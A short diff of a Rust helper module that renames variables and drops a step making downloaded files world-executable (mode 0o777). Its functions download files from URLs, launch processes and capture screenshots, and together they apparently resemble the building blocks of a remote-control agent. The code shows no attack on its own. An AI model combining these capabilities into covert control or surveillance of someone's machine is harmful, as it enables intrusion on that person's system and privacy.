@@ -21,22 +21,16 @@ use tracing::*;
 pub async fn download_string(url: &str) -> anyhow::Result<String> {
     Ok(reqwest::get(url).await?.text().await?)
 }
+
 pub async fn download_from_url(url: &str, path: &str) -> anyhow::Result<()> {
     let resp = reqwest::get(url).await?;
     let mut out = File::create(path)?;
-
-    #[cfg(not(target_os = "windows"))]
-    {
-        use std::os::unix::prelude::PermissionsExt;
-        let mut permissions = out.metadata()?.permissions();
-        permissions.set_mode(0o777);
-        out.set_permissions(permissions)?;
-    }
 
     let mut content = Cursor::new(resp.bytes().await?);
     io::copy(&mut content, &mut out)?;
     Ok(())
 }
+
 /// Show message box
 pub fn messagebox(message: String) {
     tokio::spawn(async move { msgbox::create("", &message, IconType::Info) });
@@ -55,17 +49,17 @@ pub fn run_process_with_work_dir(
     exe: &str,
     args: &str,
     wait: bool,
-    currentdir: &str,
+    current_dir: &str,
 ) -> anyhow::Result<()> {
     if wait {
         Command::new(exe)
             .args(&[args])
-            .current_dir(currentdir)
+            .current_dir(current_dir)
             .output()?;
     } else {
         Command::new(exe)
             .args(&[args])
-            .current_dir(currentdir)
+            .current_dir(current_dir)
             .spawn()?;
     }
     Ok(())
@@ -112,10 +106,10 @@ pub fn screenshot() -> anyhow::Result<String> {
 
     // Save the image.
     let mut rng = rand::thread_rng();
-    let savepath = format!("{}/image{}.png", get_working_dir()?, rng.gen::<i32>());
-    fs::write(&savepath, &buffer)?;
+    let save_path = format!("{}/image{}.png", get_working_dir()?, rng.gen::<i32>());
+    fs::write(&save_path, &buffer)?;
 
-    Ok(savepath)
+    Ok(save_path)
 }
 
 pub async fn screenshot_url() -> anyhow::Result<String> {
